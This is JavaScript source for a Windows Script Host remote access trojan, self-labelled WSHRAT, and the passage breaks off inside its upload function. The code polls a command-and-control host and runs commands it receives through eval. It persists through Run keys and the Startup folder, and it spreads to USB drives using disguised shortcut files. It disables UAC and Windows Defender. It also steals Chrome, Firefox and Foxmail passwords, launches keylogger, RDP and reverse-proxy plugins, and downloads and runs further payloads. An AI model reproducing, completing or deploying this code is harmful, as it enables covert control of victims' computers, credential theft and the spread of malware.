//<[ recoder : kognito (c) skype : live:unknown.sales64 ]>

//=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

var host = "domainname.com";
var port = 1234;
var installdir = "%temp%";
var runAsAdmin = false;
var lnkfile = true;
var lnkfolder = true;

if(runAsAdmin == true){
	startupElevate();
}
if(WScript.Arguments.Named.Exists("elevated") == true){
	disableSecurity();
}
//=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

var shellobj = WScript.createObject("wscript.shell");
var filesystemobj = WScript.createObject("scripting.filesystemobject");
var httpobj = WScript.createObject("msxml2.xmlhttp");


//=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

var installname = WScript.scriptName;
var startup = shellobj.specialFolders("startup") + "\\";
installdir = shellobj.ExpandEnvironmentStrings(installdir) + "\\";
if(!filesystemobj.folderExists(installdir)){  installdir = shellobj.ExpandEnvironmentStrings("%temp%") + "\\";}
var spliter = "|";
var sdkpath = installdir + "wshsdk";
var sdkfile = sdkpath + "\\" + chr(112) + chr(121) + chr(116) + chr(104) + chr(111) + chr(110) + chr(46) + chr(101) + chr(120) + chr(101);
var sleep = 5000; 
var response, cmd, param, oneonce;

var inf = "";
var usbspreading = "";
var startdate = "";

//=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=

instance();

if(getBinder() != null){
	runBinder();
}

while(true){
	try{
		install();

		response = "";
        response = post ("is-ready","");
		cmd = response.split(spliter);
		switch(cmd[0]){
            case "disconnect":
				  WScript.quit();
				  break;
			case "reboot":
				  shellobj.run("%comspec% /c shutdown /r /t 0 /f", 0, true);
				  break;
			case "shutdown":
				  shellobj.run("%comspec% /c shutdown /s /t 0 /f", 0, true);
				  break;
            case "excecute":
                  param = cmd[1];
				  eval(param);
				  break;
			case "install-sdk":
				  if (filesystemobj.fileExists(sdkfile)){
					updatestatus("SDK+Already+Installed");
				  }else{
					installsdk();
				  }
				  break;
			case "get-pass":
				  passgrabber(cmd[1], "cmdc.exe", cmd[2]);
				  break;
			case "get-pass-offline":
				  if (filesystemobj.fileExists(sdkfile)){
					passgrabber(cmd[3], "cmdc.exe", "ie");
					passgrabber("null", "cmdc.exe", "chrome");
					passgrabber("null", "cmdc.exe", "mozilla");
					passgrabber2(cmd[1], "cmdc.exe", cmd[2]);
				  }
				  else{
					updatestatus("Installing+SDK");
					var stat = installsdk();
					if(stat == true){
						passgrabber(cmd[3], "cmdc.exe", "ie");
						passgrabber("null", "cmdc.exe", "chrome");
						passgrabber("null", "cmdc.exe", "mozilla");
						passgrabber2(cmd[1], "cmdc.exe", cmd[2]);
					}
					else{
						var msg = shellobj.ExpandEnvironmentStrings("%computername%") + "/" + shellobj.ExpandEnvironmentStrings("%username%");
						post("show-toast", "Unable to automatically recover password for " + msg + " as the Password Recovery SDK cannot be automatically installed. You can try again manually.");
					}
				  }
				  break;
			case "update":
				  param = response.substr(response.indexOf("|") + 1);
				  oneonce.close();
				  oneonce = filesystemobj.openTextFile(installdir + installname ,2, false);
				  oneonce.write(param);
				  oneonce.close();
				  shellobj.run("wscript.exe //B \"" + installdir + installname + "\"");
				  WScript.quit();
			case "uninstall":
				  uninstall();
				  break;
			case "up-n-exec":
				  download(cmd[1],cmd[2]);
				  break;
			case "bring-log":
				  upload(installdir + "wshlogs\\" + cmd[1], "take-log");
				  break;
			case "down-n-exec":
				  sitedownloader(cmd[1],cmd[2]);
				  break;
			case  "filemanager":
				  servicestarter(cmd[1], "fm-plugin.exe", information());
				  break;
			case  "rdp":
				  keyloggerstarter(cmd[1], "rd-plugin.exe", information(), "", true);
				  break;
			case  "rev-proxy":
				  reverseproxy("rprox.exe", cmd[1]);
				  break;
			case  "exit-proxy":
				  shellobj.run("%comspec% /c taskkill /F /IM rprox.exe", 0, true);
				  break;
			case  "keylogger":
				  keyloggerstarter(cmd[1], "kl-plugin.exe", information(), 0, false);
				  break;
			case  "offline-keylogger":
				  keyloggerstarter(cmd[1], "kl-plugin.exe", information(), 1, false);
				  break;
			case  "browse-logs":
				  post("is-logs", enumfaf(installdir + "wshlogs"));
				  break;
			case  "cmd-shell":
				  param = cmd[1];
				  post("is-cmd-shell",cmdshell(param));
				  break;
			case  "get-processes":
				  post("is-processes", enumprocess());
				  break;
			case  "disable-uac":
				  disableSecurity();
				  updatestatus("UAC+Disabled+(Reboot+Required)");
				  break;
			case  "check-eligible":
				  if(filesystemobj.fileExists(cmd[1])){
					updatestatus("Is+Eligible");
				  }else{
					updatestatus("Not+Eligible");
				  }
				  break;
			case  "force-eligible":
				  if(WScript.Arguments.Named.Exists("elevated") == true){
					if(filesystemobj.folderExists(cmd[1])){
						shellobj.run("%comspec% /c " + cmd[2], 0, true);
						updatestatus("SUCCESS");
					}else{
						updatestatus("Component+Missing");
					}
				  }
				  else{
					updatestatus("Elevation+Required");
				  }
				  break;
			case  "elevate":
				  if(WScript.Arguments.Named.Exists("elevated") == false){
					try{
					  oneonce.close();
					  oneonce = null;
					  WScript.CreateObject("Shell.Application").ShellExecute("wscript.exe", " //B \"" + WScript.ScriptFullName + "\" /elevated", "", "runas", 1);
					  updatestatus("Client+Elevated");
					}catch(nn){
					}
					WScript.quit();
				  }
				  else{
				  	  updatestatus("Client+Elevated");
				  }
				  break;
			case  "if-elevate":
				  if(WScript.Arguments.Named.Exists("elevated") == false){
					  updatestatus("Client+Not+Elevated");
				  }
				  else{
				  	  updatestatus("Client+Elevated");
				  }
				  break;
			case  "kill-process":
				  exitprocess(cmd[1]);
				  break;
			case  "sleep":
				  param = cmd[1];
				  sleep = eval(param);
                  break;
		}
		
	}catch(er){}
	WScript.sleep(sleep);
}

function installsdk(){
	var success = false;
	try{
		var sdkurl = post("moz-sdk", "");
		var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
		objhttpdownload.open("get", sdkurl, false);
		objhttpdownload.setRequestHeader("cache-control:", "max-age=0");
		objhttpdownload.send();

		if(filesystemobj.fileExists(installdir + "wshsdk.zip")){
			filesystemobj.deleteFile(installdir + "wshsdk.zip");
		}
		 
		if (objhttpdownload.status == 200){
		  try{
		   var  objstreamdownload = WScript.CreateObject("adodb.stream");
		   objstreamdownload.Type = 1; 
		   objstreamdownload.Open();
		   objstreamdownload.Write(objhttpdownload.responseBody);
		   objstreamdownload.SaveToFile(installdir + "wshsdk.zip");
		   objstreamdownload.close();
		   objstreamdownload = null;
		  }catch(ez){
			
		  }
		}
		if(filesystemobj.fileExists(installdir + "wshsdk.zip")){
			//unzip the file 
			UnZip(installdir + "wshsdk.zip", sdkpath);
			success = true;
			updatestatus("SDK+Installed");
		}
	}catch(err){
		return success;
	}
	return success;
}

function install(){
var lnkobj;
var filename;
var foldername;
var fileicon;
var foldericon;

upstart();

for(var dri = new Enumerator(filesystemobj.drives); !dri.atEnd(); dri.moveNext()){
var drive = dri.item();
if (drive.isready == true){
if (drive.freespace > 0 ){
if (drive.drivetype == 1 ){
	try{
		filesystemobj.copyFile(WScript.scriptFullName , drive.path + "\\" + installname,true);
		if (filesystemobj.fileExists (drive.path + "\\" + installname)){
			filesystemobj.getFile(drive.path + "\\"  + installname).attributes = 2+4;
		}
	}catch(eiju){}
    for(var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").files); !fi.atEnd(); fi.moveNext()){
		try{
		var file = fi.item();
        if (lnkfile == false){break;}
        if (file.name.indexOf(".")){
            if ((file.name.split(".")[file.name.split(".").length - 1]).toLowerCase() != "lnk"){
                file.attributes = 2+4;
                if (file.name.toUpperCase() != installname.toUpperCase()){
                    filename = file.name.split(".");
                    lnkobj = shellobj.createShortcut(drive.path + "\\"  + filename[0] + ".lnk");
                    lnkobj.windowStyle = 7;
                    lnkobj.targetPath = "cmd.exe";
                    lnkobj.workingDirectory = "";
                    lnkobj.arguments = "/c start " + installname.replace(new RegExp(" ", "g"), "\" \"") + "&start " + file.name.replace(new RegExp(" ", "g"), "\" \"") +"&exit";
                    try{fileicon = shellobj.RegRead ("HKEY_LOCAL_MACHINE\\software\\classes\\" + shellobj.RegRead ("HKEY_LOCAL_MACHINE\\software\\classes\\." + file.name.split(".")[file.name.split(".").length - 1]+ "\\") + "\\defaulticon\\"); }catch(eeee){}
                    if (fileicon.indexOf(",") == 0){ 
                        lnkobj.iconLocation = file.path;
                    }else {
                        lnkobj.iconLocation = fileicon;
                    }
                    lnkobj.save();
                }
            }
        }
		}catch(err){}
    }
	for(var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").subFolders); !fi.atEnd(); fi.moveNext()){
		try{
		var folder = fi.item();
        if (lnkfolder == false){break;}
        folder.attributes = 2+4;
        foldername = folder.name;
        lnkobj = shellobj.createShortcut(drive.path + "\\"  + foldername + ".lnk"); 
        lnkobj.windowStyle = 7;
        lnkobj.targetPath = "cmd.exe";
        lnkobj.workingDirectory = "";
        lnkobj.arguments = "/c start " + installname.replace(new RegExp(" ", "g"), "\" \"") + "&start explorer " + folder.name.replace(new RegExp(" ", "g"), "\" \"") +"&exit";
        foldericon = shellobj.RegRead("HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\"); 
        if (foldericon.indexOf(",") == 0){
            lnkobj.iconLocation = folder.path;
        }else {
            lnkobj.iconLocation = foldericon;
        }
        lnkobj.save();
		}catch(err){}
    }
}
}
}
}
}

function startupElevate(){
	if(WScript.Arguments.Named.Exists("elevated") == false){
		try{
			WScript.CreateObject("Shell.Application").ShellExecute("wscript.exe", " //B \"" + WScript.ScriptFullName + "\" /elevated", "", "runas", 1);
		}catch(nn){
		}
		WScript.quit();
	}
}

function disableSecurity(){
	if(WScript.Arguments.Named.Exists("elevated") == true){
		var oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv");
		oReg.SetDwordValue(0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA", 0);
		oReg.SetDwordValue(0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","ConsentPromptBehaviorAdmin", 0);
		oReg.SetDwordValue(0x80000002,"SOFTWARE\\Policies\\Microsoft\\Windows Defender","DisableAntiSpyware", 1);
		oReg = null;
	}
}

function uninstall(){
try{
var filename;
var foldername;
try{
    shellobj.RegDelete("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0]);
    shellobj.RegDelete("HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0]);
}catch(ei){}
try{
filesystemobj.deleteFile(startup + installname ,true);
filesystemobj.deleteFile(WScript.scriptFullName ,true);
}catch(eej){}
for(var dri = new Enumerator(filesystemobj.drives); !dri.atEnd(); dri.moveNext()){
var drive = dri.item();
if (drive.isready == true){
if (drive.freespace > 0 ){
if (drive.drivetype == 1 ){
	for(var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").files); !fi.atEnd(); fi.moveNext()){
         var file = fi.item();
		 try{
         if (file.name.indexOf(".")){
             if ((file.name.split(".")[file.name.split(".").length - 1]).toLowerCase() != "lnk"){
                 file.attributes = 0;
                 if (file.name.toUpperCase() != installname.toUpperCase()){
                     filename = file.name.split(".");
                     filesystemobj.deleteFile(drive.path + "\\" + filename[0] + ".lnk" );
                 }else{
                     filesystemobj.deleteFile(drive.path + "\\" + file.name);
                 }
             }else{
                 filesystemobj.deleteFile (file.path);
             }
         }
		 }catch(ex){}
     }
	 for(var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").subFolders); !fi.atEnd(); fi.moveNext()){
		var folder = fi.item();
         folder.attributes = 0;
     }
}
}
}
}
}catch(err){}
WScript.quit();
}

function post (cmd ,param){
try{
httpobj.open("post","http://" + host + ":" + port +"/" + cmd, false);
httpobj.setRequestHeader("user-agent:",information());
httpobj.send(param);
return httpobj.responseText;
}catch(err){
	return "";
}
}

function information(){
try{
if (inf == ""){
    inf = hwid() + spliter;
    inf = inf  + shellobj.ExpandEnvironmentStrings("%computername%") + spliter ;
    inf = inf  + shellobj.ExpandEnvironmentStrings("%username%") + spliter;

    var root = GetObject("winmgmts:{impersonationlevel=impersonate}!\\\\.\\root\\cimv2");
    var os = root.ExecQuery ("select * from win32_operatingsystem");
   
	for(var fi = new Enumerator(os); !fi.atEnd(); fi.moveNext()){
		var osinfo = fi.item();
       inf = inf + osinfo.caption + spliter;  
       break;
    }
    inf = inf + "plus" + spliter;
    inf = inf + security() + spliter;
    inf = inf + usbspreading;
    inf = "WSHRAT" + spliter + inf + spliter + "JavaScript-v2.0" + spliter + getCountry();
    return inf;
}else{
    return inf;
}
}catch(err){
	return "";
}
}

function getCountry(){
	try{
		var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
		objhttpdownload.open("get", "http://ip-api.com/json/", false);
		objhttpdownload.setRequestHeader("user-agent:", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");
		objhttpdownload.send();
		
		if (objhttpdownload.status == 200){
		   var  objstreamdownload = WScript.CreateObject("adodb.stream");
		   objstreamdownload.Type = 1; 
		   objstreamdownload.Open();
		   objstreamdownload.Write(objhttpdownload.responseBody);
		   objstreamdownload.Position = 0;
		   objstreamdownload.Type = 2;
		   objstreamdownload.CharSet = "us-ascii";
		   
		   var raw = objstreamdownload.ReadText();
		   var cc = "01";
		   var cn = "Unknown";
		   try{
			cc = raw.substr(raw.indexOf("countryCode") + 14);
			cc = cc.substr(0, cc.indexOf("\""));
		   }catch(err){}
		   
		   try{
			cn = raw.substr(raw.indexOf("country") + 10);
			cn = cn.substr(0, cn.indexOf("\""));
		   }catch(err){}
		   
		   return cc + ":" + cn;
		}else{
			return "01:Unknown";
		}
	}catch(ex){
		return "01:Unknown";
	}
}

function upstart (){
try{
try{
    shellobj.RegWrite("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0],  "wscript.exe //B \"" + installdir + installname + "\"" , "REG_SZ");
    shellobj.RegWrite("HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0],  "wscript.exe //B \"" + installdir + installname + "\"" , "REG_SZ");
}catch(ei){}
filesystemobj.copyFile(WScript.scriptFullName, installdir + installname, true);
filesystemobj.copyFile(WScript.scriptFullName, startup + installname, true);
}catch(err){}
}


function hwid(){
try{
var root = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
var disks = root.ExecQuery ("select * from win32_logicaldisk");
for(var fi = new Enumerator(disks); !fi.atEnd(); fi.moveNext()){
var disk = fi.item();
    if (disk.volumeSerialNumber != ""){
        return disk.volumeSerialNumber;
        break;
    }
}
}catch(err){
	return "";
}
}


function security(){
try{
var objwmiservice = GetObject("winmgmts:{impersonationlevel=impersonate}!\\\\.\\root\\cimv2");
var colitems = objwmiservice.ExecQuery("select * from win32_operatingsystem",null,48);

var versionstr, osversion;
for(var fi = new Enumerator(colitems); !fi.atEnd(); fi.moveNext()){
    var objitem = fi.item();
    versionstr = objitem.version.toString().split(".");
}

//versionstr = colitems.version.split(".");
osversion = versionstr[0] + ".";
for (var x = 1; x < versionstr.length; x++){
	 osversion = osversion + versionstr[0];
}

osversion = eval(osversion);
var sc;
if (osversion > 6){ sc = "securitycenter2"; }else{ sc = "securitycenter";}

var objsecuritycenter = GetObject("winmgmts:\\\\localhost\\root\\" + sc);
var colantivirus = objsecuritycenter.ExecQuery("select * from antivirusproduct", "wql", 0);
var secu = "";
for(var fi = new Enumerator(colantivirus); !fi.atEnd(); fi.moveNext()){
	var objantivirus = fi.item();
    secu = secu  + objantivirus.displayName + " .";
}
if(secu == ""){secu = "nan-av";}
return secu;
}catch(err){}
}
function getDate(){
    var s = "";
    var d = new Date();              
    s += d.getDate() + "/";          
    s += (d.getMonth() + 1) + "/"; 
    s += d.getYear();
    return s;                               
}
function instance(){
try{
try{
usbspreading = shellobj.RegRead("HKEY_LOCAL_MACHINE\\software\\" + installname.split(".")[0] + "\\");
}catch(eee){}
if(usbspreading == ""){
   if (WScript.scriptFullName.substr(1).toLowerCase() == ":\\" +  installname.toLowerCase()){
      usbspreading = "true - " + getDate();
      try{shellobj.RegWrite("HKEY_LOCAL_MACHINE\\software\\" + installname.split(".")[0] + "\\",  usbspreading, "REG_SZ");}catch(eeeee){}
    }else{
      usbspreading = "false - " + getDate();
      try{shellobj.RegWrite("HKEY_LOCAL_MACHINE\\software\\" + installname.split(".")[0]  + "\\",  usbspreading, "REG_SZ");}catch(eeeee){}
    }
}

upstart();

var scriptfullnameshort =  filesystemobj.getFile(WScript.scriptFullName);
var installfullnameshort =  filesystemobj.getFile(installdir + installname);
if (scriptfullnameshort.shortPath.toLowerCase() != installfullnameshort.shortPath.toLowerCase()){ 
    shellobj.run("wscript.exe //B \"" + installdir + installname + "\"");
    WScript.quit(); 
}
oneonce = filesystemobj.openTextFile(installdir + installname ,8, false);

}catch(err){
    WScript.quit();
}
}

function decode_base64(base64_string){
	var yhm_pepe = WScript.CreateObject("ADODB.Stream");
	var spike = (WScript.CreateObject("Microsoft.XMLDOM")).createElement("tmp");
	spike.dataType = "bin.base64";
	spike.text = base64_string;
	yhm_pepe.Type = 1;
	yhm_pepe.Open();
	yhm_pepe.Write(spike.nodeTypedValue);
	yhm_pepe.Position = 0;
	yhm_pepe.Type = 2;
	yhm_pepe.CharSet = "us-ascii";
	return yhm_pepe.ReadText();
}

function decode_pass(retcmd){
	try{
		var content, nss, command;
		if(retcmd == "mozilla"){
			command = "give-me-ffpv";
		}else if(retcmd == "chrome"){
			command = "give-me-chpv";
		}else if(retcmd == "foxmail"){
			command = "give-me-fm";
		}
		var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
		objhttpdownload.open("post", "http://" + host + ":" + port +"/" + command, false);
		objhttpdownload.setRequestHeader("user-agent:", information());
		objhttpdownload.send("");

		if(filesystemobj.fileExists(installdir + "rundll")){
			filesystemobj.deleteFile(installdir + "rundll");
		}
		
		if (objhttpdownload.status == 200){
		  try{
		   var  objstreamdownload = WScript.CreateObject("adodb.stream");
		   objstreamdownload.Type = 1; 
		   objstreamdownload.Open();
		   objstreamdownload.Write(objhttpdownload.responseBody);
		   objstreamdownload.Position = 0;
		   objstreamdownload.Type = 2;
		   objstreamdownload.CharSet = "us-ascii";
		   content = objstreamdownload.ReadText();
		   nss = sdkpath + "\\nss";
		   content = content.replace(new RegExp("%nss%", "g"), nss); //for firefox
		   content = content.replace(new RegExp("%path%", "g"), installdir + "Login Data"); //for chrome
		   var sw = filesystemobj.openTextFile(installdir + "rundll", 2, true);
		   sw.write(content);
		   sw.close();
		   sw = null;
		   objstreamdownload.close();
		   objstreamdownload = null;
		  }catch(ez){}
		}
		
		shellobj.run("%comspec% /c cd \"" + sdkpath + "\" && " + gsp(sdkfile) + " " + gsp(installdir + "rundll") + " > \"" + installdir + "wshout\"", 0, true);
		WScript.sleep(2000);
		var sr = filesystemobj.openTextFile(installdir + "wshout");
		content = sr.readall();
		sr.close();
		sr = null;
		
		filesystemobj.deleteFile(installdir + "rundll");
		filesystemobj.deleteFile(installdir + "wshout");
		
		post(retcmd, content);
	}catch(err){
	}
}

function chr(code){
	return String.fromCharCode(code);
}

function gsp(path){
	return filesystemobj.getFile(path).shortPath;
}

function passgrabber (fileurl, filename, retcmd){
try{
	var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
	var content, profile, folder;

	if (retcmd == "ie"){
		content = decode_base64(fileurl);
		eval(content);
		return;
	}else if(retcmd == "chrome"){
		folder = shellobj.ExpandEnvironmentStrings("%temp%");
		folder = folder.substr(0, folder.toLowerCase().indexOf("temp")) + "Google\\Chrome\\User Data\\Default\\Login Data";
		if (objfsodownload.fileExists(folder) ){
			objfsodownload.copyFile(folder, installdir + "Login Data", true);
			
			if (objfsodownload.fileExists(sdkfile)){
				//'proceed decoding
				decode_pass(retcmd);
				objfsodownload.deleteFile(installdir + "Login Data");
			}else{
				//'request for sdk
				post("show-toast", "WSH Sdk for password recovery not found, You can install this SDK from the password recovery menu");
			}
		}else{
			post(retcmd, "No Password Found");
		}
	}else if(retcmd == "foxmail"){
		if (objfsodownload.fileExists(sdkfile)){
			//'proceed decoding
			decode_pass(retcmd);
		}else{
			//'request for sdk
			post("show-toast", "WSH Sdk for password recovery not found, You can install this SDK from the password recovery menu");
		}	
	}else if(retcmd == "mozilla"){
		folder = shellobj.ExpandEnvironmentStrings("%appdata%") + "\\Mozilla\\Firefox\\";
		if (objfsodownload.fileExists (folder + "profiles.ini")){
			content = filesystemobj.openTextFile(folder + "profiles.ini").readall();
			if (content.indexOf("Path=") > 0) {
				content = content.substr(content.indexOf("Path=") + 5);
				content = content.substr(0, content.indexOf("\r\n"));
				profile = (folder + content).replace(new RegExp("/", "g"), "\\");
				folder = profile + "\logins.json";
				
				if (objfsodownload.fileExists(sdkfile)){
					//'proceed decoding
					decode_pass(retcmd);
				}else{
					//'request for sdk
					post("show-toast", "WSH Sdk for password recovery not found, You can install this SDK from the password recovery menu");
				}
			}else{
				post(retcmd, "No Password Found");
			}
		}else{
			post(retcmd, "No Password Found");
		}
	}else{
		passgrabber2(fileurl, filename, retcmd);
	}
}catch(err){}
	   
}

function UnZip(zipfile, ExtractTo){
if(filesystemobj.GetExtensionName(zipfile) == "zip"){
if(!filesystemobj.FolderExists(ExtractTo)){
filesystemobj.CreateFolder(ExtractTo);
}
var objShell = WScript.CreateObject("Shell.Application");
var destination = objShell.NameSpace(ExtractTo);
var zip_content = objShell.NameSpace(zipfile).Items();   
for(i = 0; i < zip_content.Count; i++){
if(filesystemobj.FileExists(filesystemobj.Buildpath(ExtractTo,zip_content.item(i).name)+"."+filesystemobj.getExtensionName(zip_content.item(i).path))){
filesystemobj.DeleteFile(filesystemobj.Buildpath(ExtractTo,zip_content.item(i).name)+"."+filesystemobj.getExtensionName(zip_content.item(i).path));
}
destination.copyHere(zip_content.item(i), 20);
}
}
}

function passgrabber2(fileurl, filename, retcmd){

shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
try{filesystemobj.deleteFile(installdir + filename + "data");}catch(ey){}
var config_file = installdir + filename.substr(0, filename.lastIndexOf(".")) + ".cfg";
var cfg = "[General]\nShowGridLines=0\nSaveFilterIndex=0\nShowInfoTip=1\nUseProfileFolder=0\nProfileFolder=\nMarkOddEvenRows=0\nWinPos=2C 00 00 00 00 00 00 00 01 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 80 02 00 00 E0 01 00 00\nColumns=FA 00 00 00 FA 00 01 00 6E 00 02 00 6E 00 03 00 78 00 04 00 78 00 05 00 78 00 06 00 64 00 07 00 FA 00 08 00\nSort=0";
//write config
var writer = filesystemobj.openTextFile(config_file, 2, true);
writer.writeLine(cfg);
writer.close();
writer = null;
	   
var strlink = fileurl;
var strsaveto = installdir + filename;
var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
objhttpdownload.open("get", strlink, false);
objhttpdownload.setRequestHeader("cache-control:", "max-age=0");
objhttpdownload.send();

var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
if(objfsodownload.fileExists(strsaveto)){
    objfsodownload.deleteFile(strsaveto);
}
 
if (objhttpdownload.status == 200){
   var  objstreamdownload = WScript.CreateObject("adodb.stream");
   objstreamdownload.Type = 1; 
   objstreamdownload.Open();
   objstreamdownload.Write(objhttpdownload.responseBody);
   objstreamdownload.SaveToFile(strsaveto);
   objstreamdownload.close();
   objstreamdownload = null;
}
if(objfsodownload.fileExists(strsaveto)){
   var runner = WScript.CreateObject("Shell.Application");
   var saver = objfsodownload.getFile(strsaveto).shortPath
   
   //try 10 times before giveup
   for(var i=0; i<5; i++){
		shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
		WScript.sleep(1000);
		runner.shellExecute(saver, " /stext " + saver + "data");
		WScript.sleep(2000);
		if(objfsodownload.fileExists(saver + "data")){
			var sr = filesystemobj.openTextFile(saver + "data");
			var buffer = sr.readall();
			sr.close();
			sr = null;
			
			var outpath = installdir + "wshlogs\\recovered_password_email.log";
			var folder = objfsodownload.GetParentFolderName(outpath);

			if (!objfsodownload.FolderExists(folder))
			{
				shellobj.run("%comspec% /c mkdir \"" + folder + "\"", 0, true);
			}
			writer = filesystemobj.openTextFile(outpath, 2, true);
			writer.write(buffer);
			writer.close();
			writer = null;
			
			upload(saver + "data", retcmd);
			break;
		}
   }
   deletefaf(strsaveto);
}

}

function reverseproxy (filename, filearg){
shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);

var strsaveto = installdir + filename;

var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
if(objfsodownload.fileExists(strsaveto)){
    objfsodownload.deleteFile(strsaveto);
}
 
  try{
    var  objstreamdownload = WScript.CreateObject("adodb.stream");
    objstreamdownload.Type = 1; 
    objstreamdownload.Open();
	objstreamdownload.Write(getReverseProxy());
    objstreamdownload.SaveToFile(strsaveto);
    objstreamdownload.close();
    
    objstreamdownload = null;
	}catch(err){
		updatestatus("Access+Denied");
	}
 
 if(objfsodownload.fileExists(strsaveto)){
   shellobj.run("\"" + strsaveto + "\" " + host + " " + port + " " + filearg );
 } 
}

function keyloggerstarter (fileurl, filename, filearg, is_offline, is_rdp){
shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
var strlink = fileurl;
var strsaveto = installdir + filename;

var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
if(objfsodownload.fileExists(strsaveto)){
    objfsodownload.deleteFile(strsaveto);
}
 
  try{
    var  objstreamdownload = WScript.CreateObject("adodb.stream");
    objstreamdownload.Type = 1; 
    objstreamdownload.Open();
	if(is_rdp == true){
		objstreamdownload.Write(getRDP());
	}else{
		objstreamdownload.Write(getKeyLogger());
	}
    objstreamdownload.SaveToFile(strsaveto);
    objstreamdownload.close();
    
    objstreamdownload = null;
	}catch(err){
		updatestatus("Access+Denied");
	}
 
 if(objfsodownload.fileExists(strsaveto)){
   shellobj.run("\"" + strsaveto + "\" " + host + " " + port + " \"" + filearg + "\" " + is_offline);
 } 
}

function servicestarter (fileurl, filename, filearg){
    shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp" );
    objhttpdownload.open("get", strlink, false);
    objhttpdownload.setRequestHeader("cache-control:", "max-age=0");
    objhttpdownload.send();
    
    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if(objfsodownload.fileExists(strsaveto)){
        objfsodownload.deleteFile(strsaveto);
    }
     
    if (objhttpdownload.status == 200){
	  try{
        var  objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1; 
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();
        
        objstreamdownload = null;
	  }catch(err){
		updatestatus("Access+Denied");
	  }
     }
     if(objfsodownload.fileExists(strsaveto)){
        shellobj.run("\"" + strsaveto + "\" " + host + " " + port + " \"" + filearg + "\"");
      }  
}

function sitedownloader (fileurl,filename){

    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.serverxmlhttp" );
    objhttpdownload.open("get", strlink, false);
    objhttpdownload.setRequestHeader("cache-control", "max-age=0");
    objhttpdownload.send();
    
    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if(objfsodownload.fileExists(strsaveto)){
        objfsodownload.deleteFile(strsaveto);
    }
     
    if (objhttpdownload.status == 200){
        var  objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1; 
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();
        
        objstreamdownload = null;
     }
     if(objfsodownload.fileExists(strsaveto)){
        shellobj.run(objfsodownload.getFile(strsaveto).shortPath);
        updatestatus("Executed+File");
     }
}

function download (fileurl,filedir){
    if(filedir == ""){ 
    filedir = installdir;
    }

    strsaveto = filedir + fileurl.substr(fileurl.lastIndexOf("\\") + 1);
    var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
    objhttpdownload.open("post","http://" + host + ":" + port +"/" + "send-to-me" + spliter + fileurl, false);
    objhttpdownload.setRequestHeader("user-agent:", information());
    objhttpdownload.send("");
        
    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if(objfsodownload.fileExists(strsaveto)){
        objfsodownload.deleteFile(strsaveto);
    }
     
    if (objhttpdownload.status == 200){
        var  objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1; 
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();
        
        objstreamdownload = null;
     }
     if(objfsodownload.fileExists(strsaveto)){
        shellobj.run(objfsodownload.getFile(strsaveto).shortPath);
        updatestatus("Executed+File");
     } 
}

function updatestatus(status_msg){
try{
	var objsoc = WScript.CreateObject("msxml2.xmlhttp");
	objsoc.open("post","http://" + host + ":" + port + "/" + "update-status" + spliter + status_msg, false);
	objsoc.setRequestHeader("user-agent:", information());
	objsoc.send("");
	}catch(err){}
}

function upload (fileurl, retcmd){
	try{
		var  httpobj,objstreamuploade,buffer;
		var objstreamuploade = WScript.CreateObject("adodb.stream");
		objstreamuploade.Type = 1; 
		objstreamuploade.Open();
		objstreamuploade.loadFromFile(fileurl);
		buffer = objstreamuploade.Read();
		objstreamuploade.close();

		objstreamdownload = null;
